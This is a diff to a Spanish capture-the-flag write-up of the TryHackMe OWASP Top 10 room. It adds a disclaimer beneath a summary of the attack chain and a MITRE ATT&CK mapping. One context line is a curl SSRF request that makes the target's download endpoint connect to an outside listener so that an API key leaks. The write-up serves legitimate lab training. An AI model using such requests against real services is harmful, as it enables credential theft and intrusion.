@@ -271,3 +271,14 @@ curl 'http://IP:8087/download?server=10.14.61.233:12345&id=75482342'
 **Learning chain:** IDOR → sqlite + cracking de MD5 → command injection → diseño inseguro (reset) → consola de depuración → RCE en componentes → auth bypass por espaciado → SRI y JWT none → lectura de logs → SSRF/exfiltración de API key.
 **MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1059.006 (Command and Scripting Interpreter: Python), T1078 (Valid Accounts), T1212 (Exploitation for Credential Access), T1606.001 (Web Session Cookie), T1110 (Brute Force), T1005 (Data from Local System), T1041 (Exfiltration Over C2 Channel), T1206? no aplica → cubre A01-A10 de OWASP.
 **Fuente:** [TryHackMe - OWASP Top 10 - 2021](https://tryhackme.com/room/owasptop102021)
+
+---
+
+## ⚠️ Descargo de Responsabilidad (Disclaimer)
+
+Este contenido se presenta exclusivamente con fines académicos y educativos.
+
+**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
+**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
+**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
+**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
